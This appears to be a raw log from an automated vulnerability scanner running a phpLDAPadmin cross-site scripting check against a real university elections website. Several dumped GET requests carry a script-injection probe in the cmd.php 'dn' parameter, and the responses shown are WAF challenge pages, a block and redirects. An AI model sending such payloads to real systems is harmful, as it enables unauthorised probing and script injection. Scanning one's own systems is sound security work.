@@ -1,0 +1,606 @@
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 4639
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3220071=/PtNNyH7Q3iKXfrunwsyyAtyk2gAAAAAQUIPAAAAAAC7FSJkVgBkazJOjQuCp5v5; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=PJt9QbVYNj8F57arov5JAwtyk2gAAAAApOUmgPyh/QSAN/q9PgMrcA==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 3-2162516-0 NNNN RT(1754493451427 26) q(0 -1 -1 -1) r(0 -1) B10(14,0,0) U24
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <noscript>
+            <title>Pardon Our Interruption</title>
+        </noscript>
+
+        <meta name="viewport" content="width=1000">
+        <meta name="robots" content="noindex, nofollow">
+        <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="0">
+
+        <style>
+            .container { max-width: 800px; margin: auto; font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif; color: #7a838c; }
+            h1 { color: #2a2d30; font-weight: 500; }
+            li { margin: 0 0 10px; }
+            a { color: #428bca; }
+            a:hover, a:focus { color: #2a6496; }
+        </style>
+
+        <script>
+          var isSpa = new URLSearchParams(window.location.search).get('X-SPA') === '1' || window.isImpervaSpaSupport;
+        </script>
+
+        <!-- This head template should be placed before the following script tag that loads the challenge script -->
+        <script>
+          window.onProtectionInitialized = function(protection) {
+            if (protection && protection.cookieIsSet && !protection.cookieIsSet()) {
+              showBlockPage();
+              return;
+            }
+            if (!isSpa) {
+              window.location.reload(true);
+            }
+          };
+          window.reeseSkipExpirationCheck = true;
+        </script>
+
+        <script>
+          if (!isSpa) {
+            var scriptElement = document.createElement('script');
+            scriptElement.type = "text/javascript";
+            scriptElement.src = "/FINIS-THE-TRAGEDIE-OF-MACBETH-tye-shake-and-sigh/5505862338179045646?s=JTMDcLeE";
+            scriptElement.async = true;
+            scriptElement.defer = true;
+            document.head.appendChild(scriptElement);
+          }
+        </script>
+        <script type="text/javascript">if (sessionStorage) { sessionStorage.setItem('distil_referrer', document.referrer); }</script>
+    </head>
+    <body>
+
+        
+
+        <div class="container">
+            <script>document.getElementsByClassName("container")[0].style.display = "none";</script>
+            
+            <h1>Pardon Our Interruption</h1>
+<p>As you were browsing something about your browser made us think you were a bot. There are a few reasons this might happen:</p>
+<ul>
+<noscript><li>You've disabled JavaScript in your web browser.</li></noscript>
+<li>You're a power user moving through this website with super-human speed.</li>
+<li>You've disabled cookies in your web browser.</li>
+<li>A third-party browser plugin, such as Ghostery or NoScript, is preventing JavaScript from running. Additional information is available in this <a title='Third party browser plugins that block javascript' href='http://ds.tl/help-third-party-plugins' target='_blank'>support article</a>.</li>
+</ul>
+<p>To regain access, please make sure that cookies and JavaScript are enabled before reloading the page.</p>
+
+
+        </div>
+	
+        <div id="interstitial-inprogress" style="display: none">
+          <style>
+    #interstitial-inprogress {
+      width:100%;
+      height:100%;
+      position:absolute;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      z-index:9999;
+      background:white url("/_Incapsula_Resource?NWFURVBO=images/error_pages/bg.png") no-repeat center;
+    }
+    #interstitial-inprogress-box{
+      font-size:32px;
+      box-shadow:0 4px 14px 0 #0000001A,0 8px 24px 0 #00000021;
+      font-family:Inter,Helvetica,Arial,sans-serif;
+      position:absolute;
+      left:50%;
+      top:50%;
+      transform:translate(-50%,-50%);
+      background-color:white;
+      text-align:center;
+      width:auto;
+      min-width:min(95%,640px);
+      max-width:max-content;
+      padding:16px;
+    }
+    #interstitial-inprogress-box h3{
+      font-size:48px;
+    }
+  </style>
+  <div id="interstitial-inprogress-box">
+    <h3>Please stand by</h3>
+    <p>We&apos;re getting everything ready for you. The page is loading, and you&apos;ll be on your way in just a few moments.</p>
+    <p>Thanks for your patience!</p>
+  </div>
+
+        </div>
+
+        <script>
+          function showBlockPage() {
+            document.title = "Pardon Our Interruption";
+            document.getElementsByClassName("container")[0].style.display = "block";
+          }
+
+          if (isSpa) {
+            showBlockPage();
+          } else {
+            window.interstitialTimeout = setTimeout(showBlockPage, 10000);
+          }
+        </script>
+    </body>
+</html>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET //cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 833
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3220071=20v+vNaESUizmin19WBzxwtyk2gAAAAAQUIPAAAAAAD8ratagmShLrzro7sWFoTi; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=De0mVhdUc2kG57arov5JAwtyk2gAAAAAdpWIls2GoJaOxCxSJ6QYhw==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 12-10109073-0 0NNN RT(1754493451427 32) q(0 -1 -1 -1) r(0 -1) B15(1,903758,0) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/alband-Then-now-not-by-the-wortune-Vpon-his-Fee-" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=12-10109073-0%200NNN%20RT%281754493451427%2032%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c903758%2c0%29%20U24&incident_id=237000430032586535-51999882032777932&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032586535-51999882032777932</iframe></body></html>
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+
+GET /phpldapadmin/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 4639
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3220071=EQl6SpMERwGuYJAQxYls1Qtyk2gAAAAAQUIPAAAAAAAlxGV3JhNr4H3nF1obnx/M; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=3ezlDAIEjXMN57arov5JAwtyk2gAAAAA5WJpqmioK2y1JcIDWRyfcw==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 3-2162515-0 NNNN RT(1754493451427 23) q(0 -1 -1 -1) r(0 -1) B10(14,0,0) U24
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <noscript>
+            <title>Pardon Our Interruption</title>
+        </noscript>
+
+        <meta name="viewport" content="width=1000">
+        <meta name="robots" content="noindex, nofollow">
+        <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="0">
+
+        <style>
+            .container { max-width: 800px; margin: auto; font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif; color: #7a838c; }
+            h1 { color: #2a2d30; font-weight: 500; }
+            li { margin: 0 0 10px; }
+            a { color: #428bca; }
+            a:hover, a:focus { color: #2a6496; }
+        </style>
+
+        <script>
+          var isSpa = new URLSearchParams(window.location.search).get('X-SPA') === '1' || window.isImpervaSpaSupport;
+        </script>
+
+        <!-- This head template should be placed before the following script tag that loads the challenge script -->
+        <script>
+          window.onProtectionInitialized = function(protection) {
+            if (protection && protection.cookieIsSet && !protection.cookieIsSet()) {
+              showBlockPage();
+              return;
+            }
+            if (!isSpa) {
+              window.location.reload(true);
+            }
+          };
+          window.reeseSkipExpirationCheck = true;
+        </script>
+
+        <script>
+          if (!isSpa) {
+            var scriptElement = document.createElement('script');
+            scriptElement.type = "text/javascript";
+            scriptElement.src = "/FINIS-THE-TRAGEDIE-OF-MACBETH-tye-shake-and-sigh/5505862338179045646?s=oVmy1d3Y";
+            scriptElement.async = true;
+            scriptElement.defer = true;
+            document.head.appendChild(scriptElement);
+          }
+        </script>
+        <script type="text/javascript">if (sessionStorage) { sessionStorage.setItem('distil_referrer', document.referrer); }</script>
+    </head>
+    <body>
+
+        
+
+        <div class="container">
+            <script>document.getElementsByClassName("container")[0].style.display = "none";</script>
+            
+            <h1>Pardon Our Interruption</h1>
+<p>As you were browsing something about your browser made us think you were a bot. There are a few reasons this might happen:</p>
+<ul>
+<noscript><li>You've disabled JavaScript in your web browser.</li></noscript>
+<li>You're a power user moving through this website with super-human speed.</li>
+<li>You've disabled cookies in your web browser.</li>
+<li>A third-party browser plugin, such as Ghostery or NoScript, is preventing JavaScript from running. Additional information is available in this <a title='Third party browser plugins that block javascript' href='http://ds.tl/help-third-party-plugins' target='_blank'>support article</a>.</li>
+</ul>
+<p>To regain access, please make sure that cookies and JavaScript are enabled before reloading the page.</p>
+
+
+        </div>
+	
+        <div id="interstitial-inprogress" style="display: none">
+          <style>
+    #interstitial-inprogress {
+      width:100%;
+      height:100%;
+      position:absolute;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      z-index:9999;
+      background:white url("/_Incapsula_Resource?NWFURVBO=images/error_pages/bg.png") no-repeat center;
+    }
+    #interstitial-inprogress-box{
+      font-size:32px;
+      box-shadow:0 4px 14px 0 #0000001A,0 8px 24px 0 #00000021;
+      font-family:Inter,Helvetica,Arial,sans-serif;
+      position:absolute;
+      left:50%;
+      top:50%;
+      transform:translate(-50%,-50%);
+      background-color:white;
+      text-align:center;
+      width:auto;
+      min-width:min(95%,640px);
+      max-width:max-content;
+      padding:16px;
+    }
+    #interstitial-inprogress-box h3{
+      font-size:48px;
+    }
+  </style>
+  <div id="interstitial-inprogress-box">
+    <h3>Please stand by</h3>
+    <p>We&apos;re getting everything ready for you. The page is loading, and you&apos;ll be on your way in just a few moments.</p>
+    <p>Thanks for your patience!</p>
+  </div>
+
+        </div>
+
+        <script>
+          function showBlockPage() {
+            document.title = "Pardon Our Interruption";
+            document.getElementsByClassName("container")[0].style.display = "block";
+          }
+
+          if (isSpa) {
+            showBlockPage();
+          } else {
+            window.interstitialTimeout = setTimeout(showBlockPage, 10000);
+          }
+        </script>
+    </body>
+</html>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/
+Set-Cookie: visid_incap_3220071=ex7nRm6ST128zxc8/JzNzgtyk2gAAAAAQUIPAAAAAABA+jPGZLgAM5bVTzxZpr9x; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=V0ZZS3cwZWwe57arov5JAwtyk2gAAAAA544Wu1VoO+yv4tKcNArQOA==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056353-0 0NNN RT(1754493451428 50) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3220071=W9OUNaw2Q5iYQzQ4vVfjqgtyk2gAAAAAQUIPAAAAAAAFptC9+SlF8KPArM1eDyxP; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=O9feEK2aMgAi57arov5JAwtyk2gAAAAA2DaY0IkDXr6PDtfc9urxrw==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056352-0 0NNN RT(1754493451428 52) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+
+GET /htdocs/index.php/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3220071=DQBtw6SYSH+KdLGr5eQqWQtyk2gAAAAAQUIPAAAAAACmdB9ESv48HrXN0NXmnPtj; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=y0+qRy0DwXwk57arov5JAwtyk2gAAAAASZOIKcjk+R2H1oar66kjlw==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056355-0 0NNN RT(1754493451428 56) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/
+Set-Cookie: visid_incap_3220071=8d5BZ2PXRnCT08PVW36mawtyk2gAAAAAQUIPAAAAAAAf4TwhhuGwG55hdDAd0U+b; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=TaKWMSFczXsr57arov5JAwtyk2gAAAAAMW1znNBDrhwTwTjNqixNPQ==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056356-0 0NNN RT(1754493451428 65) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3220071=u4ZC8I06QPWl+gBpOchfRQtyk2gAAAAAQUIPAAAAAACGOpxH+zBGWFXPhGp/GaYJ; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=yiCmFYutVRE557arov5JAwtyk2gAAAAAG164xN7bAwu0PMd3Ar6iUg==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056362-0 0NNN RT(1754493451428 77) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://elections.union.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+
+GET //index.php?redirect=true&meth=ajax HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://elections.union.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 4639
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3220071=6rT5M3YJRsquBZPsGUtz3wtyk2gAAAAAQUIPAAAAAAB1RzRnXqWPRQ1N9cuvw1MB; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=6ABgKg1uJQU/57arov5JAwtyk2gAAAAAYXe3cLR45LSQjfB8zF3HqA==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056351-0 NNNN RT(1754493451428 43) q(0 -1 -1 -1) r(0 -1) B10(14,0,0) U24
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <noscript>
+            <title>Pardon Our Interruption</title>
+        </noscript>
+
+        <meta name="viewport" content="width=1000">
+        <meta name="robots" content="noindex, nofollow">
+        <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="0">
+
+        <style>
+            .container { max-width: 800px; margin: auto; font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif; color: #7a838c; }
+            h1 { color: #2a2d30; font-weight: 500; }
+            li { margin: 0 0 10px; }
+            a { color: #428bca; }
+            a:hover, a:focus { color: #2a6496; }
+        </style>
+
+        <script>
+          var isSpa = new URLSearchParams(window.location.search).get('X-SPA') === '1' || window.isImpervaSpaSupport;
+        </script>
+
+        <!-- This head template should be placed before the following script tag that loads the challenge script -->
+        <script>
+          window.onProtectionInitialized = function(protection) {
+            if (protection && protection.cookieIsSet && !protection.cookieIsSet()) {
+              showBlockPage();
+              return;
+            }
+            if (!isSpa) {
+              window.location.reload(true);
+            }
+          };
+          window.reeseSkipExpirationCheck = true;
+        </script>
+
+        <script>
+          if (!isSpa) {
+            var scriptElement = document.createElement('script');
+            scriptElement.type = "text/javascript";
+            scriptElement.src = "/FINIS-THE-TRAGEDIE-OF-MACBETH-tye-shake-and-sigh/8113439822070355506?s=DwwnhLMp";
+            scriptElement.async = true;
+            scriptElement.defer = true;
+            document.head.appendChild(scriptElement);
+          }
+        </script>
+        <script type="text/javascript">if (sessionStorage) { sessionStorage.setItem('distil_referrer', document.referrer); }</script>
+    </head>
+    <body>
+
+        
+
+        <div class="container">
+            <script>document.getElementsByClassName("container")[0].style.display = "none";</script>
+            
+            <h1>Pardon Our Interruption</h1>
+<p>As you were browsing something about your browser made us think you were a bot. There are a few reasons this might happen:</p>
+<ul>
+<noscript><li>You've disabled JavaScript in your web browser.</li></noscript>
+<li>You're a power user moving through this website with super-human speed.</li>
+<li>You've disabled cookies in your web browser.</li>
+<li>A third-party browser plugin, such as Ghostery or NoScript, is preventing JavaScript from running. Additional information is available in this <a title='Third party browser plugins that block javascript' href='http://ds.tl/help-third-party-plugins' target='_blank'>support article</a>.</li>
+</ul>
+<p>To regain access, please make sure that cookies and JavaScript are enabled before reloading the page.</p>
+
+
+        </div>
+	
+        <div id="interstitial-inprogress" style="display: none">
+          <style>
+    #interstitial-inprogress {
+      width:100%;
+      height:100%;
+      position:absolute;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      z-index:9999;
+      background:white url("/_Incapsula_Resource?NWFURVBO=images/error_pages/bg.png") no-repeat center;
+    }
+    #interstitial-inprogress-box{
+      font-size:32px;
+      box-shadow:0 4px 14px 0 #0000001A,0 8px 24px 0 #00000021;
+      font-family:Inter,Helvetica,Arial,sans-serif;
+      position:absolute;
+      left:50%;
+      top:50%;
+      transform:translate(-50%,-50%);
+      background-color:white;
+      text-align:center;
+      width:auto;
+      min-width:min(95%,640px);
+      max-width:max-content;
+      padding:16px;
+    }
+    #interstitial-inprogress-box h3{
+      font-size:48px;
+    }
+  </style>
+  <div id="interstitial-inprogress-box">
+    <h3>Please stand by</h3>
+    <p>We&apos;re getting everything ready for you. The page is loading, and you&apos;ll be on your way in just a few moments.</p>
+    <p>Thanks for your patience!</p>
+  </div>
+
+        </div>
+
+        <script>
+          function showBlockPage() {
+            document.title = "Pardon Our Interruption";
+            document.getElementsByClassName("container")[0].style.display = "block";
+          }
+
+          if (isSpa) {
+            showBlockPage();
+          } else {
+            window.interstitialTimeout = setTimeout(showBlockPage, 10000);
+          }
+        </script>
+    </body>
+</html>
+
